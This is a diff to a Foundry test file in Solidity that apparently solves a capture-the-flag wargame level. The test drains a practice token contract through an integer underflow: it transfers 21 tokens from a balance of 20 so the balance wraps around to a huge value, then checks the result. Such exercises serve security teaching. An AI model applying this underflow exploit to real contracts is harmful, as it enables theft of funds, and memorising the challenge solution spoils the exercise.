@@ -43,11 +43,14 @@ contract TokenTest is Test {
 
     function testTokenHack() external {
         vm.startPrank(attacker);
-        address attacker2 = makeAddr("attacker2");
-        token.transfer(attacker2, type(uint).max - 5);
-        uint256 attacker2Balance = token.balanceOf(attacker2);
-        assertGt(attacker2Balance, playerSupply, "Test Failed!");
+        address toAddress = makeAddr("toAddress");
+
+        // 20 - 21. This will underflow
+        token.transfer(toAddress, 21);
+        uint256 attackerBalance = token.balanceOf(attacker);
+        assertGt(attackerBalance, playerSupply, "Test Failed!");
         tokenFactory.validateInstance(payable(address(token)), attacker);
+        console.log("Balance after hack :", attackerBalance);
         vm.stopPrank();
     }
 }
